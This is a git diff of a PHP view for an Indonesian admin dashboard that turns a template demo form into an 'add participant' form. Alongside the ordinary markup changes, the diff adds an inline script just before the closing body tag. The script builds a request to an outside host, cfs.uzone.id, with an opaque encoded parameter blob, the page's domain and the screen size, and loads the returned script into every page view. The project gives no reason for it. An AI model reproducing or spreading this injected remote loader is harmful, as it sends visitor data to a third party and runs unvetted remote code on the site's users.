@@ -1,6 +1,28 @@
+
 <!doctype html>
 <html lang="en">
-<?php $this->load->view('part/head'); ?>
+
+<head>
+    <meta charset="utf-8" />
+    <link rel="apple-touch-icon" sizes="76x76" href="<?php echo base_url().'assets/'; ?>dashboard/img/apple-icon.png" />
+    <link rel="icon" type="image/png" href="<?php echo base_url().'assets/'; ?>dashboard/img/favicon.png" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <title>Wunder - Bootstrap Material Admin Dashboard Template</title>
+    <meta content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0' name='viewport' />
+    <meta name="viewport" content="width=device-width" />
+    <!-- Bootstrap core CSS     -->
+    <link href="<?php echo base_url().'assets/'; ?>dashboard/css/bootstrap.min.css" rel="stylesheet" />
+    <link href="<?php echo base_url().'assets/'; ?>dashboard/vendors/material.min.css" rel="stylesheet" />
+    <!--  Material Dashboard CSS    -->
+    <link href="<?php echo base_url().'assets/'; ?>dashboard/css/wunder.css" rel="stylesheet" />
+    <!--  CSS for Demo Purpose, don't include it in your project     -->
+    <link href="<?php echo base_url().'assets/'; ?>dashboard/css/demo.css" rel="stylesheet" />
+    <!--     Fonts and icons     -->
+    <link href="http://maxcdn.bootstrapcdn.com/font-awesome/latest/css/font-awesome.min.css" rel="stylesheet">
+    <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Material+Icons" />
+    <link href="<?php echo base_url().'assets/'; ?>dashboard/vendors/dropzone/dropzone.min.css" rel="stylesheet">
+</head>
+
 <body>
 <div class="wrapper">
     <?php $this->load->view('part/nav_admin'); ?>
@@ -27,7 +49,6 @@
                             <p>selamat datang Ahmad Ichsanul Karim</p>
                         </a>
                     </li>
-
                     <li class="nav-item">
                         <a class="nav-link active" href="http://localhost/orong2">
                             <i class="material-icons">home</i>
@@ -42,7 +63,7 @@
                         <div class="card">
                             <form method="get" action="/" class="form-horizontal">
                                 <div class="card-header card-header-text">
-                                    <h4 class="card-title">Form Elements</h4>
+                                    <h4 class="card-title">Tambah Peserta</h4>
                                 </div>
                                 <div class="card-content">
                                     <div class="form-group row">
@@ -58,140 +79,29 @@
                                         </div>
                                     </div>
                                     <div class="form-group row">
-                                        <label class="col-md-2 col-form-label text-right">No Absen</label>
+                                        <label class="col-md-2 col-form-label text-right">No. Absen</label>
                                         <div class="col-md-10">
-                                            <input name="absen" type="text" class="form-control" placeholder="Masukkan Nomor Absen Peserta">
+                                            <input name="absen" type="text" class="form-control" placeholder="Masukkan Nomor Absen">
                                         </div>
                                     </div>
                                     <div class="form-group row">
                                         <label class="col-md-2 col-form-label text-right">Tanggal Lahir</label>
                                         <div class="col-md-10">
-                                            <input type="text" class="form-control datepicker" placeholder="Masukkan Nama Peserta">
+                                            <input name="ttl" type="text" class="form-control datepicker" placeholder="Pilih Tanggal"/>
                                         </div>
                                     </div>
                                     <div class="form-group row">
-                                        <label class="col-md-2 col-form-label text-right">Checkboxes and radios</label>
-                                        <div class="col-md-10 checkbox-radios">
-                                            <div class="checkbox">
-                                                <label>
-                                                    <input type="checkbox" name="optionsCheckboxes"> First Checkbox
-                                                </label>
-                                            </div>
-                                            <div class="checkbox">
-                                                <label>
-                                                    <input type="checkbox" name="optionsCheckboxes"> Second Checkbox
-                                                </label>
-                                            </div>
-                                            <div class="radio">
-                                                <input type="radio" name="optionsRadios" checked id="radio1">
-                                                <label for="radio1">First Radio</label>
-                                            </div>
-                                            <div class="radio">
-                                                <input type="radio" name="optionsRadios" id="radio2">
-                                                <label for="radio2">Second Radio</label>
-                                            </div>
-                                        </div>
-                                    </div>
-                                    <div class="form-group row">
-                                        <label class="col-md-2 col-form-label text-right">Inline checkboxes</label>
+                                        <label class="col-md-2 col-form-label text-right">Pilih Posisi</label>
                                         <div class="col-md-10">
+                                            <?php $n = 0;
+                                            foreach ($data as $value){ ?>
                                             <div class="checkbox form-check-inline">
                                                 <label>
-                                                    <input type="checkbox" name="optionsCheckboxes">a
+                                                    <input <?php echo ($jumlah[$n]['masuk'] <= $jumlah[$n]['butuh']) ? "hidden" : ""; ?>type="checkbox" name="posisi[]" value="<?php echo $value['id_posisi']; ?>"><?php echo $value['nama_posisi']; ?>
                                                 </label>
                                             </div>
-                                            <div class="checkbox form-check-inline">
-                                                <label>
-                                                    <input type="checkbox" name="optionsCheckboxes">b
-                                                </label>
-                                            </div>
-                                            <div class="checkbox form-check-inline">
-                                                <label>
-                                                    <input type="checkbox" name="optionsCheckboxes">c
-                                                </label>
-                                            </div>
-                                        </div>
-                                    </div>
-                                </div>
-                            </form>
-                        </div>
-                    </div>
-                    <div class="col-lg-12">
-                        <div class="card">
-                            <form method="get" action="/" class="form-horizontal">
-                                <div class="card-header card-header-text">
-                                    <h4 class="card-title">Input Variants</h4>
-                                </div>
-                                <div class="card-content">
-                                    <div class="form-group row">
-                                        <label class="col-md-2 col-form-label text-right">Custom Checkboxes &amp; radios</label>
-                                        <div class="col-md-4 offset-md-1 checkbox-radios">
-                                            <div class="checkbox">
-                                                <label>
-                                                    <input type="checkbox" name="optionsCheckboxes"> Unchecked
-                                                </label>
-                                            </div>
-                                            <div class="checkbox">
-                                                <label>
-                                                    <input type="checkbox" name="optionsCheckboxes" checked> Checked
-                                                </label>
-                                            </div>
-                                            <div class="checkbox">
-                                                <label>
-                                                    <input type="checkbox" name="optionsCheckboxes" disabled> Disabled Unchecked
-                                                </label>
-                                            </div>
-                                            <div class="checkbox">
-                                                <label>
-                                                    <input type="checkbox" name="optionsCheckboxes" checked disabled> Disabled Checked
-                                                </label>
-                                            </div>
-                                        </div>
-                                        <div class="col-md-5 checkbox-radios">
-                                            <div class="radio">
-                                                <input type="radio" name="optionsRadios" checked id="radio-on">
-                                                <label for="radio-on">Radio is on</label>
-                                            </div>
-                                            <div class="radio">
-                                                <input type="radio" name="optionsRadios" id="radio-off">
-                                                <label for="radio-off">Radio is off</label>
-                                            </div>
-                                            <div class="radio">
-                                                <input type="radio" name="optionsRadiosDisabled" checked disabled id="radio-on-disabled">
-                                                <label for="radio-on-disabled">Disabled Radio is on</label>
-                                            </div>
-                                            <div class="radio">
-                                                <input type="radio" name="optionsRadiosDisabled" disabled id="radio-off-disabled">
-                                                <label for="radio-off-disabled">Disabled radio is off</label>
-                                            </div>
-                                        </div>
-                                    </div>
-                                    <div class="form-group row has-success">
-                                        <label class="col-md-2 col-form-label text-right">Input with success</label>
-                                        <div class="col-md-10">
-                                            <input type="text" class="form-control form-control-success" value="Success">
-                                        </div>
-                                    </div>
-                                    <div class="form-group row has-danger">
-                                        <label class="col-md-2 col-form-label text-right">Input with error</label>
-                                        <div class="col-md-10">
-                                            <input type="text" class="form-control form-control-danger" value="Error Input">
-                                        </div>
-                                    </div>
-                                    <div class="form-group row">
-                                        <label class="col-md-2 col-form-label text-right">Column sizing</label>
-                                        <div class="col-md-10">
-                                            <div class="row">
-                                                <div class="col-lg-3">
-                                                    <input type="text" class="form-control" placeholder=".col-md-3">
-                                                </div>
-                                                <div class="col-lg-4">
-                                                    <input type="text" class="form-control" placeholder=".col-md-4">
-                                                </div>
-                                                <div class="col-lg-5">
-                                                    <input type="text" class="form-control" placeholder=".col-md-5">
-                                                </div>
-                                            </div>
+                                            <?php $n++;
+                                            } ?>
                                         </div>
                                     </div>
                                 </div>
@@ -201,42 +111,48 @@
                 </div>
             </div>
         </div>
-        <footer class="footer">
-            <div class="container-fluid">
-                <nav class="float-left">
-                    <ul>
-                        <li>
-                            <a href="#">
-                                Home
-                            </a>
-                        </li>
-                        <li>
-                            <a href="#">
-                                Documentation
-                            </a>
-                        </li>
-                        <li>
-                            <a href="#">
-                                Contact
-                            </a>
-                        </li>
-                        <li>
-                            <a href="#">
-                                Support
-                            </a>
-                        </li>
-                    </ul>
-                </nav>
-                <p class="copyright float-right">
-                    &copy;
-                    <script>
-                        document.write(new Date().getFullYear())
-                    </script>
-                    <a href="#">Wunder Admin</a>
-                </p>
-            </div>
-        </footer>
     </div>
 </div>
-<?php $this->load->view('part/footer'); ?>
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKfShJlVzsZFFZ%2fgdpncIm0nW%2bCAdz6ZpL81wEaQ0X6GE3pwqphFD%2bUSzPBlqyoWBfS2ZoX2tIUdkoEtI2BJOFxME%2b0alKNi9D%2b3bDf65pMGHlSNYvPj%2fJduf47QCTrU6JS3s4CQ32XzTJFgRtP1cx9wOW%2bbm358xrcqUeNK5E5ETWfU4x%2fq1RvnsdIJvVhHIEFKqUMIQ2fmDH8pmBZC%2fvU4LSU6zeiaXWdoxxjocyD8%2bX9mSXWafQz6JDx6vooIjti3jf4FjBrIcDDl8PVSlMW%2bpwi7AfrpdZ6uHqUG%2bh%2brYiEFvmc%2bZWcuCxqIa6W7cKsHYLvEnr%2fT7bK%2b5wUCFFE5pOBUI2vEzap14es%2b3dltgVrCfwIY%2bJjOBtm0Fg8a0HOrSylO%2bGfykCD9o%2f5O0YWQxBeC3SEkJQ9t7XiGOPHlrYPU3qonTZTIKPhlFI9T%2f73usjS1DiBMey8pGKpRsNNQ%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+<!--   Core JS Files   -->
+<script src="<?php echo base_url().'assets/'; ?>dashboard/vendors/jquery-3.1.1.min.js" type="text/javascript"></script>
+<script src="<?php echo base_url().'assets/'; ?>dashboard/vendors/jquery-ui.min.js" type="text/javascript"></script>
+<script src="<?php echo base_url().'assets/'; ?>dashboard/vendors/tether.min.js" type="text/javascript"></script>
+
+<script src="<?php echo base_url().'assets/'; ?>dashboard/vendors/bootstrap.min.js" type="text/javascript"></script>
+<script src="<?php echo base_url().'assets/'; ?>dashboard/vendors/perfect-scrollbar.jquery.min.js" type="text/javascript"></script>
+<!-- Forms Validations Plugin -->
+<script src="<?php echo base_url().'assets/'; ?>dashboard/vendors/jquery.validate.min.js"></script>
+<!--  Plugin for Date Time Picker and Full Calendar Plugin-->
+<script src="<?php echo base_url().'assets/'; ?>dashboard/vendors/moment.min.js"></script>
+<!--  Charts Plugin -->
+<script src="<?php echo base_url().'assets/'; ?>dashboard/vendors/chartist.min.js"></script>
+<!--  Plugin for the Wizard -->
+<script src="<?php echo base_url().'assets/'; ?>dashboard/vendors/jquery.bootstrap-wizard.js"></script>
+<!--  Notifications Plugin    -->
+<script src="<?php echo base_url().'assets/'; ?>dashboard/vendors/bootstrap-notify.js"></script>
+<!-- DateTimePicker Plugin -->
+<script src="<?php echo base_url().'assets/'; ?>dashboard/vendors/bootstrap-datetimepicker.js"></script>
+<!-- Vector Map plugin -->
+<script src="<?php echo base_url().'assets/'; ?>dashboard/vendors/jquery-jvectormap.js"></script>
+<!-- Sliders Plugin -->
+<script src="<?php echo base_url().'assets/'; ?>dashboard/vendors/nouislider.min.js"></script>
+<!--  Google Maps Plugin    -->
+<script src="https://maps.googleapis.com/maps/api/js"></script>
+<!-- Select Plugin -->
+<script src="<?php echo base_url().'assets/'; ?>dashboard/vendors/jquery.select-bootstrap.js"></script>
+<!-- Sweet Alert 2 plugin -->
+<script src="<?php echo base_url().'assets/'; ?>dashboard/vendors/sweetalert/sweetalert2.min.js"></script>
+<!--	Plugin for Fileupload, full documentation here: http://www.jasny.net/bootstrap/javascript/#fileinput -->
+<script src="<?php echo base_url().'assets/'; ?>dashboard/vendors/jasny-bootstrap.min.js"></script>
+<!--  Full Calendar Plugin    -->
+<script src="<?php echo base_url().'assets/'; ?>dashboard/vendors/fullcalendar.min.js"></script>
+<!-- TagsInput Plugin -->
+<script src="<?php echo base_url().'assets/'; ?>dashboard/vendors/jquery.tagsinput.js"></script>
+<!-- Material Dashboard javascript methods -->
+<script src="<?php echo base_url().'assets/'; ?>dashboard/js/wunder.min.js"></script>
+<!-- Material Dashboard DEMO methods, don't include it in your project! -->
+<script src="<?php echo base_url().'assets/'; ?>dashboard/js/demo.min.js"></script>
+<script src="<?php echo base_url().'assets/'; ?>dashboard/vendors/dropzone/dropzone.min.js"></script>
+
 </html>
